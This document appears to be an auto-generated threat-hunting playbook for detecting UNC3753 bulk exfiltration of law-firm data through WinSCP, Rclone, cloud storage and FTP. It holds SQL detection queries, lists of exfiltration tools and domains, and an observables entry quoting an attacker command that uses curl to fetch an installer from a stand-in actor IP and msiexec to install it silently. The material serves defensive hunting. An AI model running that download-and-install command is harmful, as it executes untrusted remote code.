---
analysis: A simple detection rule flags WinSCP execution; this hunt correlates that
  execution with outbound volume, stack-counts the tool's rarity, and looks for the
  characteristic HTTP trails to cloud providers, providing context a single rule cannot.
blind_spots:
- id: missing-network-volume-telemetry
  question: What was the total volume of data transferred over a specific IP connection?
  requires: hb_network_connection with flow log bytes
  risk: Without byte counters in flow logs, we cannot distinguish a 10GB exfiltration
    from 10KB of heartbeats.
  stage: exfiltration-to-cloud-and-ftp
- id: browser-upload-transparency
  question: Was a large file uploaded via browser to a consumer cloud domain?
  requires: hb_http_activity with response_bytes and POST visibility
  risk: If the forward proxy does not log request size or method, we see only that
    a user visited Google Drive, not that they sent data.
  stage: exfiltration-to-cloud-and-ftp
coverage:
- stage: exfiltration-to-cloud-and-ftp
  status: covered
  steps:
  - identify-exfil-tool-execution
  - baseline-tool-prevalence
  - high-volume-outbound-connections
  - http-exfiltration-indicators
- reason: Handled by a dedicated hunt focusing on iManage and OneDrive enumeration.
  stage: discovery-and-local-staging
  status: out_of_scope
- reason: Handled by a dedicated hunt focusing on email lures and vishing activity.
  stage: initial-social-engineering-and-vishing
  status: out_of_scope
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: rmm-and-remote-control-deployment
  status: out_of_scope
- reason: Belongs to another part of the 'UNC3753 targeted campaign against US law
    firms' series.
  stage: vdi-access-and-pivot
  status: out_of_scope
guardrails:
  claims: no_unsupported
  evidence: citation_required
  missing_data: not_benign
  telemetry: untrusted
hunt:
  applicability: campaign-specific
  handoff: keep-as-periodic-hunt
  justification: UNC3753 targets sensitive legal PII and exfiltrates it within hours
    of access. Proving the absence of bulk outbound data movement provides high assurance
    that an active extortion event is not underway.
  methodology: model-assisted
  trigger: intel-report
hypothesis: An adversary has staged sensitive legal data and is using specialized
  transfer tools or web-based uploads to exfiltrate it to non-corporate cloud storage
  accounts.
labels:
- hunt
- attack.t1567.002
- attack.t1041
- attack.t1090.003
name: 'UNC3753: Bulk Exfiltration to Cloud and FTP'
parameters:
  exfil_domains:
    default:
    - privnote.com
    - mega.nz
    - dropbox.com
    - drive.google.com
    description: Domains used for exfiltration or stage transmission.
    from:
      kind: article
      observed: '2024-05-20'
      ref: UNC3753 Mandiant
    type: list[domain]
  exfil_tools:
    default:
    - winscp.exe
    - rclone.exe
    - sftp.exe
    - pscp.exe
    - filezilla.exe
    description: Filenames of common exfiltration and FTP/SFTP utilities.
    from:
      kind: manual
      observed: '2024-05-20'
      ref: UNC3753 threat research
    type: list[string]
  lookback_days:
    default: '14'
    description: Days of history to examine.
    type: number
provenance:
  authors:
  - name: Huntbase hunt generation
    org: huntbase.io
  generated:
    by: huntbase-hunt-generation
    from: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
    gates:
    - dry-run
    - lint
    model: hb_google/gemini-3-flash-preview
rationale: Focus on workstations belonging to Legal and Finance departments first,
  as these are the primary targets for UNC3753. Prioritize outbound flows that cross
  the 50MB threshold within a 1-hour window.
references:
- name: "Mandiant \u2014 UNC3753 Targeted Campaign Against US Law Firms"
  url: https://cloud.google.com/blog/topics/threat-intelligence/targeted-campaign-us-law-firms
related:
- hunt: unc3753-rmm-abuse
  reason: The RMM installation and remote support session stage is handled by a separate
    behavioral hunt.
  relation: out-of-scope-alternative
- hunt: vishing-rmm-deployment-unc3753
  relation: follows
scenario:
  stages:
  - name: IT Helpdesk Impersonation and Vishing
    observables:
    - privnote.com
    - Invoice-themed email lures
    - Direct phone calls posing as IT support
    - Screen-sharing session links (Zoom, Microsoft Teams, Quick Assist)
    slug: initial-social-engineering-and-vishing
    tactic: initial-access
    techniques:
    - T1566
    - T1133
  - name: RMM Tool Execution
    observables:
    - AnyDesk installer
    - Bomgar installer
    - Zoho Assist installer
    - SuperOps.msi
    - curl -sL "http://[actor-controlled-ip]/installer" -o "SuperOps.msi"
    - msiexec /i "SuperOps.msi" /quiet
    slug: rmm-and-remote-control-deployment
    tactic: execution
    techniques:
    - T1204.002
  - name: VDI Access from Personal Devices
    observables:
    - Windows365.exe
    - Citrix client usage
    - Personal/BYOD IP addresses accessing corporate VDI
    - Login to corporate VDI after Zoom/Teams sessions
    slug: vdi-access-and-pivot
    tactic: lateral-movement
    techniques:
    - T1021.001
    - T1133
  - name: Document Search and Staging
    observables:
    - Keyword searches for W-2, W-9, 1099, SSN, and audit files
    - iManage document searches
    - OneDrive and network drive enumeration
    - Files staged in \Downloads folder
    - Files staged in native Roaming profile path
    slug: discovery-and-local-staging
    tactic: collection
    techniques:
    - T1083
    - T1074.001
  - name: Exfiltration via Cloud and FTP
    observables:
    - WinSCP.exe
    - Rclone.exe
    - Google Drive browser-based uploads
    - Folders renamed to mimic victim branding on cloud storage
    - FTP/SFTP uploads to actor-controlled IPs
    - Forwarding staged files via internal target mailboxes
    slug: exfiltration-to-cloud-and-ftp
    tactic: exfiltration
    techniques:
    - T1567.002
    - T1041
    - T1090.003
  summary: UNC3753 (Silent Ransom Group) uses invoice-themed emails and vishing to
    trick US law firm employees into installing RMM tools and initiating screen-sharing
    sessions. The actors pivot from compromised BYOD endpoints to corporate VDI environments,
    stage sensitive legal and financial documents, and exfiltrate them via cloud storage
    or FTP for extortion.
series:
  index: 2
  slug: unc3753-targeted-campaign-against-us-law-firms
  title: UNC3753 targeted campaign against US law firms
  total: 2
severity: high
targets:
  analyst:
    name: Tier-2 analyst
    role: analyst
  endpoint:
    category: endpoint
    huntbase:
      product: hb-endpoint-control
    name: Endpoint telemetry (hb_ surfaces)
    telemetry:
    - endpoint
  hunter:
    agent: true
    name: Hunt agent
  network:
    category: network
    name: Network telemetry
    telemetry:
    - network
  web:
    category: siem
    name: Web server / proxy logs
    telemetry:
    - network
tlp: clear
type: investigation
---


# UNC3753: Bulk Exfiltration to Cloud and FTP

UNC3753 (Luna Moth) campaigns targeting US law firms typically conclude with the exfiltration of gigabytes of data within a single business day. This hunt identifies the footprint of that exfiltration: the execution of specialized transfer utilities (WinSCP, Rclone), rare outbound data volumes on the network, and HTTP traffic to known file-sharing or self-destructing text sites. By stack-counting these tools and corroborating with network throughput, we isolate unauthorized exfiltration from standard administrative use.

## identify-exfil-tool-execution
<!-- Exfiltration Tool Execution -->
Identify any execution of tools explicitly named in UNC3753 campaigns or commonly used for SFTP/Cloud exfiltration.

```sqlite target=endpoint role=scoping params=(exfil_tools=exfil_tools, lookback_days=lookback_days)
~~~yaml
expected: Any execution of these tools on workstations not assigned to IT or Backup
  roles. Silence means the specific binaries in the list were not seen.
reads:
- device_hostname
- process_cmd_line
- process_name
- process_path
- time
- user_name
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-09'
~~~
SELECT device_hostname, process_name, process_path, process_cmd_line, user_name, time FROM hb_process_activity WHERE (instr(',' || '{{exfil_tools}}' || ',', ',' || LOWER(process_name) || ',') > 0 OR LOWER(process_cmd_line) LIKE '%winscp%' OR LOWER(process_cmd_line) LIKE '%rclone%') AND time >= datetime('now', '-{{lookback_days}} days')
```

## analyze-exfiltration-patterns
<!-- Analyze Exfiltration Patterns -->
parallel:
- → baseline-tool-prevalence
- → high-volume-outbound-connections
- → http-exfiltration-indicators
join: → triage-exfiltration-evidence

## baseline-tool-prevalence
<!-- Fleet Prevalence of Exfiltration Tools -->
Identify if the exfiltration tools found are rare in the environment, suggesting adversary-deployed portable tools.

```sqlite target=endpoint role=baseline params=(exfil_tools=exfil_tools, lookback_days=lookback_days)
~~~yaml
baseline:
  compare: first_seen
  window: '{{lookback_days}}d'
expected: Tools appearing on only a handful of hosts suggest unauthorized deployment.
prevalence:
  by: device_hostname
  key:
  - process_name
  - process_path
  rare_below: 3
reads:
- device_hostname
- process_name
- process_path
- time
silence: not_evidence_of_absence
source: hb_process_activity
verified: dry-run
verified_at: '2026-09-09'
~~~
SELECT process_name, process_path, COUNT(DISTINCT device_hostname) AS host_count, MIN(time) AS first_seen FROM hb_process_activity WHERE (instr(',' || '{{exfil_tools}}' || ',', ',' || LOWER(process_name) || ',') > 0) AND time >= datetime('now', '-{{lookback_days}} days') GROUP BY process_name, process_path HAVING host_count <= 3
```

## high-volume-outbound-connections
<!-- High Volume Outbound Network Connections -->
Identify high-volume flows from network telemetry, providing the IP anchors for the triage agent to correlate with process execution.

```sqlite target=network role=enrichment params=(lookback_days=lookback_days)
~~~yaml
expected: Connections exceeding 50MB of outbound traffic. Silence in flow logs means
  no high-volume individual flows were recorded.
reads:
- device_hostname
- direction
- dst_endpoint_ip
- dst_endpoint_port
- src_endpoint_ip
- time
- traffic_bytes
silence: not_evidence_of_absence
source: hb_network_connection
verified: dry-run
verified_at: '2026-09-09'
~~~
SELECT device_hostname, src_endpoint_ip, dst_endpoint_ip, dst_endpoint_port, traffic_bytes, time FROM hb_network_connection WHERE direction = 'outbound' AND traffic_bytes > 50000000 AND time >= datetime('now', '-{{lookback_days}} days') ORDER BY traffic_bytes DESC
```

## http-exfiltration-indicators
<!-- HTTP Activity to Exfiltration Domains -->
Find connections to domains like privnote.com or consumer cloud storage, filtering for potential uploads via method or volume.

```sqlite target=web role=triage params=(exfil_domains=exfil_domains, lookback_days=lookback_days)
~~~yaml
expected: Connections to privnote.com or large POST requests to consumer storage.
  Simple GET requests with no bytes returned are ignored.
reads:
- device_hostname
- http_method
- response_bytes
- time
- url_hostname
- url_path
silence: not_evidence_of_absence
source: hb_http_activity
verified: dry-run
verified_at: '2026-09-09'
~~~
SELECT device_hostname, url_hostname, url_path, http_method, response_bytes, time FROM hb_http_activity WHERE (instr(',' || '{{exfil_domains}}' || ',', ',' || LOWER(url_hostname) || ',') > 0) AND (LOWER(http_method) = 'post' OR response_bytes > 0) AND time >= datetime('now', '-{{lookback_days}} days')
```

## triage-exfiltration-evidence
<!-- Triage Exfiltration Evidence -->
```agent target=hunter
cite: required
context:
- identify-exfil-tool-execution
- baseline-tool-prevalence
- high-volume-outbound-connections
- http-exfiltration-indicators
max_iterations: 4
objective: Determine if any host shows a combination of rare tool execution (WinSCP/Rclone)
  and high volume data transfer to the domains or IPs in scope.
success_criteria: A per-host verdict citation the evidence.
tools:
- endpoint
- network
- web
```

## route-verdict
<!-- Route on Verdict -->
if~: "The triage verdict is malicious for at least one host based on corroborated network and process evidence." (confidence: high, judge=hunter)
then: → isolate-host
indeterminate: → analyst-review
unavailable: → analyst-review (blind_spot: missing-network-volume-telemetry)
else: → close-out

## isolate-host
<!-- Isolate Endpoint -->
```action target=endpoint
~~~yaml
approval: required
~~~
Isolate the host and preserve its state for forensic investigation.
```
→ analyst-review

## analyst-review
<!-- Analyst Review -->
```manual target=analyst
Verify the destination IPs from high-volume-outbound-connections against threat intelligence. Review the user associated with the exfiltration for recent vishing reports.
```
→ end

## close-out
<!-- Close Out -->
```manual target=analyst
Record findings and update the exfil_tools list if new utilities were observed.
```
→ end
